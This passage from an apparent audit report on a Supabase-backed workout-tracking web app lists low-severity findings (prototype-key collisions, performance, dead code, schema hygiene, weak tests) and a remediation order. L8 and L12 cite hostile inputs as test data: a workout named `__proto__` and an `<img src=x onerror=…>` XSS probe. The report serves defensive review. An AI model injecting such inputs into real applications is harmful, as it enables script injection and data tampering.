- **Fix:** Use a single source (`Version`), have the build inject it into `index.html` and the cache-busting queries, and skip the web poll when `isNativeApp()`.

### L6: Startup normalisation overrides user edits
- **File:** `index.html:1540-1545`. `if (UNI.indexOf(e.name) >= 0) e.sets = 4;` runs on every launch and is persisted at the next `save()` or sync. `rest` is only filled in for names in the hard-coded `REST` map.
- **Scenario:** The user sets "Single-Arm Cable Lateral Raises" to 6 sets in the plan editor. After a reload it's 4 again. An exercise without `rest` (legacy or copied) shows `NaN:NaN` in the rest bar.
- **Fix:** Apply defaults only when the field is missing (`e.sets == null`, `e.rest == null`), and default `rest` to 90.

### L7: Duplicate exercise names in one workout collide
- **File:** `index.html:920` (the draft is keyed by `card.dataset.exName`), `:1072`/`:1094`/`:1672` (`lastUsed` keyed by name), `:1089` (`find` returns the first match).
- **Scenario:** A workout listing "Bench Press" twice (copied or legacy; `plan.js:117` stops new duplicates) resumes both cards from the second card's draft. The last-used values for one overwrite the other.
- **Fix:** Key by index, or give each plan entry a stable id.

### L8: Workout names that match `Object.prototype` keys break
- **File:** `plan.js:149` (`if (window.WORKOUTS[n])`), `cloud.js:57` (`window.WORKOUTS[name]=…`).
- **Scenario:** Creating a workout named "constructor" or "toString" fails with "You already have a workout with that name." Copying a shared workout and naming it `__proto__` replaces the prototype of `WORKOUTS` instead of adding a routine.
- **Fix:** Use `Object.create(null)` or a `Map`, and check `Object.prototype.hasOwnProperty.call`.

### L9: Performance: oversized DOM, always-on timers and chatty sync
- **File and scenario:**
  - `index.html:1966-1980` rebuilds **120** "Coming up" rows on every `renderToday`. That function runs on every plan save (`plan.js:39`), every merge and every Today tab.
  - `:1909-1928` rebuilds the calendar from the first logged month to 24 months ahead (more than 1,000 cells, each with a closure) on every calendar visit and every hydrate.
  - `:1793` runs `setInterval(refreshActive, 1000)` forever, including when no workout is active.
  - There are three `change` and two `input` listeners on `#sessionExercises` (`:954`, `:968`, `:974`, `:1729`, `:1735`). Every keystroke serialises the whole draft (`:974`). Every 400 ms autosave sends `gym:progress-changed`, which re-uploads the **entire** log history plus progress as one JSONB document (`cloud.js:16`, debounced 700 ms).
  - `cloud.js:64` re-runs `render()` → `social()` on every Friends or Settings tap: 9 or more sequential round-trips, including the full friend weight history (M7).
- **Fix:** Render about 14 upcoming days and paginate the calendar. Start the interval only while a workout is active. Sync logs incrementally (per-session rows). Cache the social data and refresh on demand.

### L10: Dead code, duplication and CSS that fights CSS
- **What's wrong:**
  - Dead or replaced code: the original `renderCalendar` (`index.html:1223-1249`) and its `TAGS` map naming removed presets, plus `prevMonth`/`nextMonth` hidden at `:1419`. `sparklineSVG` and the stat-history rows (`:1153-1161`, `:1207-1215`) are built and then removed at `:2037`. The `saveTemplateBtn` handler (`:1065-1080`) is hidden at `:1418` and removed at `:1591`. `.exercise-target`, `.exercise-note` and `.hero-done` are rendered and then hidden. `window.cloudShareWorkout`, `cloudSyncPlan`, `cloudCurrentUser` and `openPlanWorkout` are never called.
  - Duplication: the preset fingerprint and hashes (`index.html:681-682` and `cloud.js:10-11`), three escapers (`cloud.js:5`, `plan.js:29`, `index.html:926`), the `lastUsed` Proxy (`:1568-1573` and `:1579-1584`), and two date formatters (`todayStr`/`ymd`).
  - CSS: `plan.js:19-27` injects three stylesheets at runtime, which redefine `.plan-edit-row`, `.account-card` and the `:root` colours already set in `index.html`. `index.html:1497-1506` overrides earlier rules with `!important` (5 uses).
- **Fix:** Remove the second-script patch layer by folding its behaviour into the original functions. Move the CSS into one stylesheet and keep one `esc` helper.

### L11: Schema hygiene
- **File:** `schema.sql:73-157` (`create policy` without `drop policy if exists`, so the file can't be re-run, unlike the migrations). There is no baseline migration for `profiles`, `friend_requests`, `shared_workouts` or `leaderboard_stats`. Policies call `auth.uid()` per row instead of `(select auth.uid())`, which the Supabase performance advisor flags. There is no index on `shared_workouts(owner_id)`, and the JSONB columns have no size limit (`schema.sql:22`, `:37`, `:53-54`).
- **Fix:** Add a baseline migration, make policies idempotent, wrap `auth.uid()`, add the index, and add `pg_column_size` checks.

### L12: The tests fail, and only grep for strings
- **Result:** `Ran 4 tests … FAILED (failures=3)`. The failures:
  - `test_private_history_is_not_automatically_uploaded`: `"Publish my stats"` isn't in `cloud.js`.
  - `test_social_and_builder_are_wired`: `"Workout builder"` is in `plan.js`, not `cloud.js`.
  - `test_social_and_builder_are_wired`: `"wger.de/api/v2"` appears nowhere.
- **What's wrong:** All four tests are substring checks on source files (`tests/test_static.py:9-37`). The one named "private history is not automatically uploaded" still passes its first two assertions even though history *is* uploaded, because it greps for an old table name (`user_data`). None of the tests checks RLS behaviour, merge logic, escaping or the friend-request policy.
- **Fix:** Add a pgTAP or `supabase test db` suite for RLS, including C1 and H2 cases, and run it in CI. Extract the merge functions (`mergedPlan`, log, weight and progress merges) into a module with unit tests (Node or Vitest). Add an XSS regression test that renders a workout named `<img src=x onerror=…>`.

---

## Suggested order of work

1. **C1**: lock down the friend-request UPDATE, then audit existing `accepted` rows.
2. **H1**: escape the `index.html` sinks and validate copied workouts. Add CSP.
3. **H2 / M7 / M15**: add a delete policy and UI, an exact-match username lookup, a friend-summary view, and self-service deletion.
4. **H5 / H6 / H4 / M10**: rotate to a secret release key, build release, split CI permissions with a lockfile, and vendor supabase-js.
5. **H3, M1-M4, M11-M13**: data integrity (per-record ids and timestamps, sign-out ownership, crash guards, removing the 5 kg rounding).
6. Docs, tests and cleanup (M14, L-items).
